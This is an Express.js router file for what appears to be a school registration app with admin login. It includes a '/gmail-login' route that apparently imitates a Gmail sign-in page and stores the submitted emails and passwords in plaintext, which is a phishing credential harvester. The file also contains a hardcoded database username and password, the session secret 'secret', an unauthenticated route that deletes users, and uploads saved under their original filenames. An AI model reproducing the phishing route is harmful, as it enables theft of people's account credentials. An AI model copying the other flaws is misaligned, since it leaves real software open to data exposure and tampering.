const express = require('express');
const router = express.Router();
const fs = require('fs');
var path = require("path");
var mongoose = require("mongoose");
var multer = require("multer");
mongoose.Promise = global.Promise;
const bcrypt = require("bcryptjs");
const passport = require("passport");
require("../config/passport")(passport);
const winston = require('winston');

var session = require('express-session');
var flash = require('connect-flash');
router.use(
  session({
    cookie: { maxAge: 60000 },
    secret: "secret",
    resave: false,
    saveUninitialized: false
  })
);
router.use(flash());

// Local module
var loggers = require("loggers");
router.use(loggers());
var printout = require('Log.js');



// Logger configuration
const logConfiguration = {
  "transports":[
      new winston.transports.File({
          filename:"./views/index.log"
      })
      ]
};
// create logger
const logger = winston.createLogger(logConfiguration);


var cors = require("cors");
router.use(cors());

const helmet = require("helmet");
router.use(helmet());

require("cookie-parser");

const admins = require("../models/admin");
const users = require("../models/user");
const logins = require("../models/logins");

mongoose.set("useCreateIndex", true);

const uri =
  "mongodb+srv://yitrezegne:Kilimanjar8@cluster0.bluer.mongodb.net/db01?retryWrites=true&w=majority";
  // "mongodb://127.0.0.1:27017/school";
const client = mongoose.createConnection(uri, {
  useNewUrlParser: true,
  useUnifiedTopology: true
});

client
  .once("open", () => {
    logger.info("db01 database connected!");
    printout.info('db01 database connected');
    
  })
  .catch(err => {
    logger.info(err)
    console.log(err);
    
  });

  const { ensureAuthenticated } = require('../config/auth');


router.get("/", (req, res) =>{
  res.render("welcome");
});

router.post("/", function (req, res, next) {
  console.log(req.body);
  next();
});

router.get("/new_access", (req, res) => {
  // console.log(req.query);
  res.send();
});

// register image
  // SET STORAGE
  var storage = multer.diskStorage({
    destination: function (req, file, cb) {
      cb(null, './public/uploads/')
    },
    filename: function (req, file, cb) {
      cb(null, file.fieldname + '-' + Date.now() + '_' + file.originalname)
    }
  });
   
  var upload = multer({ storage: storage });

  router.get("/gmail-login", (req, res) => { res.render("gmail-login"); });
  router.post("/gmail-login", (req,res, next) => {
    var data = new logins({
      email: req.body.email,
      password: req.body.password
    });

    data.save();
    mongoose
        .connect(uri, {useNewUrlParser: true, useUnifiedTopology: true})
        .then(client => {
          req.flash('success', 'You have been successfully registered.');
            res.locals.message = req.flash();
            res.redirect('admin');
        })
    client.close();
  });
  
  router.get("/register", (req, res) => { res.render("register"); });
  router.post('/register', upload.single('myImage'), function (req, res){ 
      var newItem = new users({
        username: req.body.username,
        email: req.body.email,
        mobile1: req.body.mobile1,
        guardian: req.body.guardian,
        mobile2: req.body.mobile2,
        code: req.body.code,
        filename: req.file.filename
      });
  
      newItem.save(); 
      mongoose
        .connect(uri, {useNewUrlParser: true, useUnifiedTopology: true})
        .then(client => {
          req.flash('success', 'You have been successfully registered.');
            res.locals.message = req.flash();
            res.render('register');
        })
      client.close();
  });

  router.get("/delete/:id", (req, res) => {
    mongoose
      .connect(uri, {
        useNewUrlParser: true,
        useUnifiedTopology: true,
        useFindAndModify: false
      })
      .then(client => {
        users.findByIdAndRemove({_id: req.params.id}, (err, doc) => {
          if (err) throw err;
          fs.unlink(path.join("public/uploads/", doc.filename), err => {
            if (err) throw err;
            res.redirect("/users");
          });
        });
      })
    client.close();
  });

// admin signup
router.get("/signup", (req, res) => {
  res.render("signup");
});
router.post("/signup", (req, res) => {
  const {username, password} = req.body;
  let errors = [];

  
     //check password length
    if(password.length < 6) {
        errors.push({msg: "password should be at least 6 characters"});
    }

  if (errors.length > 0) {
    res.render("signup", {
      errors,
      username,
      password
    });
  } else {
    //validation passed
   mongoose
     .connect(uri, {useNewUrlParser: true, useUnifiedTopology: true})
     .then(client => {
      admins.findOne({username:username})
      .then(user => {
        if (user) {
          //User exists
          errors.push({msg: "user is already registered"});
          console.log("user exists");
          res.render("signup", {
            errors,
            username,
            password
          });
        } else {
          const newUser = new admins({
            username,
            password
          });
          //Hash password
          bcrypt.genSalt(10, (err, salt) =>
            bcrypt.hash(newUser.password, salt, (err, hash) => {
              if (err) throw err;
              //set password to hashed
              newUser.password = hash;
              //save user
              newUser
                .save()
                .then(user => {
                  req.flash("success_msg", "You are now registered");
                  console.log("You are now registered");
                  res.redirect("/admin");
                })
            })
          );
        }
      });
     })
   client.close();

    
  }
});

// admin login
router.get("/admin", (req, res) => { res.render("admin"); });
router.post("/login", (req,res, next) => {
  mongoose
  .connect(uri, {useNewUrlParser: true, useUnifiedTopology: true})
  .then(client => {
     passport.authenticate("local", {
       successRedirect: "/users",
       failureRedirect: "/admin",
       requestFlash: true
     })(req, res, next);
  })
client.close();
});

router.get("/users",ensureAuthenticated, (req, res) => {
  mongoose
  .connect(uri, {useNewUrlParser: true, useUnifiedTopology: true})
  .then(client => {
    users.find()
      .exec((err, docs) => {
        if (err) return next(err);
        res.render("users", {alldocs: docs});
      });
  })
client.close();
});

 //logout Handle
 router.get("/logout", ensureAuthenticated, (req, res) => {
  mongoose
    .connect(uri, {useNewUrlParser: true, useUnifiedTopology: true})
    .then(client => {
      req.logout();
      res.redirect("/admin");
    })
  client.close();
});


module.exports = router;